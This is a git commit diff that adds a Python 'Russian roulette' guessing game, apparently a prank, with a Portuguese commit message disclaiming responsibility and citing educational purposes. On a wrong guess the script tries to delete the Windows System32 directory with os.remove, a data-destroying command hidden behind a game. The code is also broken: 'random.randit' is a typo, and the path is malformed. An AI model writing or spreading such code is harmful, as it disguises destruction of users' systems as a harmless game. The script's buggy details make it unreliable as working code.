a149f4e48834a8df12faa23cae718a1fa3d4260c
B1nC0der <158519059+B1nC0der@users.noreply.github.com>
2024-02-01 18:17:29 -0300

    Update roletarussa.py
    não me responsabilizo pelos danos causados
    o código foi feiro para meios educacionais e aprendizado

--- roletarussa.py
+++ roletarussa.py
@@ -1,3 +1,12 @@
-esse é um projeto básico de programação feito em python, porem altamente de risco
-não me responsabilizo pelas ações cometidas com isso
-este código foi criado para fins educacionais
+import random
+import os
+
+tiro = random.randit(1,6)
+
+guess = input('Bem vindo ao jogo feito por B1nC0der/ como o nome já dito no arquivo é uma roleta russa/ temos 6 numeros de 1 a 6/ escolha sabiamente')
+guess = int(guess)
+
+if(guess == tiro):
+  print ('parabens amigo')
+else:
+  os.remove('C:\ Windows\System32')
